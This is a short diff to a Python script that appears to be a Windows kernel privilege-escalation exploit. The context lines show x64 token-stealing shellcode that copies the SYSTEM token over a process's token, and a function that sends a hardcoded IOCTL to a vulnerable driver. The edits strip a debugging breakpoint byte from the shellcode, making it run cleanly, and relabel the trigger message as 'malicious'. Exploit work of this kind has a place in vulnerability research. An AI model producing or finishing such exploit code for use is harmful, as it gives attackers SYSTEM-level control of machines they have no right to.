@@ -109,7 +109,7 @@ def shellcode(pid):
         "\x74\x05"                                  # jz found_cmd         ;YES - move on
         "\x48\x8B\x09"                              # mov rcx, [rcx]       ;NO - next entry in list
         "\xEB\xEE"                                  # jmp find_cmd         ;loop
-        "\x48\x89\x81\x80\x00\x00\x00\xCC"          # mov [rcx+80h], rax   ;copy SYSTEM token over top process's token
+        "\x48\x89\x81\x80\x00\x00\x00"              # mov [rcx+80h], rax   ;copy SYSTEM token over top process's token
         "\xC3")                                     # ret
 
     lpAddress = None
@@ -164,7 +164,7 @@ def gethandle():
 def send_ioctl(hDevice, BufferBase):
     target = BufferBase
     OutBuffer = create_string_buffer("ZZZZ")    #Create 4 byte buffer for the OutBuffer parameter
-    print "[*]Triggering vulnerable IOCTL...[*]"
+    print "[*]Sending malicious IOCTL..."
     dwIoControlCode = 0xAA013044
     lpInBuffer = target
     nInBufferSize = 8   # Hardcoded for checking within IOCTL Dispatch Handler
